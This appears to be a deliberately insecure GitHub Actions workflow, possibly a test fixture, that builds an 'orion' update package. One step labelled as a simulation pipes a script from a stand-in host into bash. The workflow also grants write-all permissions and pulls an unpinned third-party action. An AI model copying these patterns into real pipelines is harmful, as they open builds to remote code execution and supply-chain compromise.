name: orion-update-release

on:
  push:
    branches: [main]

permissions: write-all

jobs:
  build-update:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: third-party/setup-release@main
      - name: Install dependencies
        run: npm ci
      - name: Simulated remote bootstrap
        run: |
          echo "SIMULATION ONLY"
          curl https://updates.example.invalid/orion/bootstrap.sh | bash
      - name: Build update package
        run: npm run build

